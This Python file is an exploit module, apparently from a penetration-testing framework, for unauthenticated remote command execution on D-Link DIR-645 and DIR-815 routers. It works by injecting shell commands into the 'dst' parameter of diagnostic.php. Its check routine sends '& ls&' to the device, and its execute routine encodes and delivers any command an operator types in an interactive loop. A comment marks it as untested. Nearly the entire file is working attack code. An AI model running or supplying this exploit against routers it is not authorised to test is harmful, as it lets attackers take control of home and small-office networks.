#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: 'arvin'

from template.exploit import BaseExploit


class Exploit(BaseExploit):
    __info__ = {
        'name': 'D-Link DIR-645 815 Reomte Command Execute',
        'description': 'D-Link DIR 645 815 allow remote command execute without credits',
        'reference': ['http://www.s3cur1ty.de/m1adv2013-017'],
    }

    prompt = 'rce_645_815_diagnostic_rce'

    def __init__(self):
        super().__init__()

    def run(self, host, port, timeout):
        # TODO NOT TESTING
        if self.check(host, port, timeout):
            self.command_loop(host, port, timeout)

    def check(self, host, port, timeout):
        url = "http://{}:{}/diagnostic.php".format(host, port, timeout)
        headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
        data = {"act": "ping",
                "dst": "& ls&"}

        response, err = self.http_post(self.s, url, timeout, data, headers=headers)
        if err:
            self.print_requests_err(host, port, err)
            self.print_check_result(False, host)
            return False

        if response.status_code == 200 and "<report>OK</report>" in response.text:
            self.print_check_result(True, host)
            return True  # target is vulnerable

        self.print_check_result(False, host)
        return False  # target is not vulnerable

    def execute(self, host, port, timeout, cmd):
        cmd = "%26 {}%26".format(cmd.replace("&", "%26"))

        url = "http://{}:{}/diagnostic.php".format(host, port)
        headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
        data = "act=ping&dst={}".format(cmd)

        response, err = self.http_post(self.s, url, timeout, data, headers=headers)

        if err:
            self.print_requests_err(host, port, err)
            return ''
        else:
            if response.status_code == 200 and "<report>OK</report>" in response.text:
                return 'Execute success'
            else:
                return 'Execute failed'
